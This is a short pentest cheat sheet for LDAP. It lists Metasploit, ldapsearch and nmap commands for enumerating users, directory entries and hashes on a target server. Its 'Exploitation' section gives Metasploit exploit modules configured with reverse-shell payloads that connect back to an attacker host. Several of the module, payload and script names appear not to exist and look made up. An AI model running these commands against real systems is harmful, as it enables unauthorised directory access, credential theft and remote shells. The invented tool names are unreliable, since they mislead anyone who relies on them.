# LDAP

## Enumeration

### Metasploit

##### ldap_enum
```bash
use auxiliary/scanner/ldap/ldap_enum
set RHOSTS [IP]
set RPORT 389
run
```

##### ldap_users
```bash
use auxiliary/scanner/ldap/ldap_users
set RHOSTS [IP]
set RPORT 389
run
```

##### ldap_enum_hashes
```bash
use auxiliary/scanner/ldap/ldap_enum_hashes
set RHOSTS [IP]
set RPORT 389
run
```

##### ldap_search
```bash
use auxiliary/scanner/ldap/ldap_search
set RHOSTS [IP]
set RPORT 389
set SEARCH_BASE "dc=example,dc=com"
run
```

##### ldap_version
```bash
use auxiliary/scanner/ldap/ldap_version
set RHOSTS [IP]
set RPORT 389
run
```

### ldapsearch

##### ldapsearch (basic enumeration)
```bash
ldapsearch -x -H ldap://[IP] -b "dc=example,dc=com"
```

##### ldapsearch (with specific filter)
```bash
ldapsearch -x -H ldap://[IP] -b "dc=example,dc=com" "(objectClass=person)"
```

### nmap
##### nmap (LDAP version and info)
```bash
nmap -p 389 --script=ldap-rootdse [IP]
```

##### nmap (LDAP user enumeration)
```bash
nmap -p 389 --script=ldap-enum-users [IP]
```

##### nmap (LDAPS enumeration)
```bash
nmap -p 636 --script=ssl-enum-ciphers [IP]
```


---
---


## Exploitation

### Metasploit

##### ldap_sudo_exec
```bash
use exploit/unix/ldap/ldap_sudo_exec
set RHOSTS [IP]
set RPORT 389
set PAYLOAD cmd/unix/reverse
set LHOST [IP]
set LPORT [port]
run
```

##### ldap_rce
```bash
use exploit/linux/ldap/ldap_rce
set RHOSTS [IP]
set RPORT 389
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```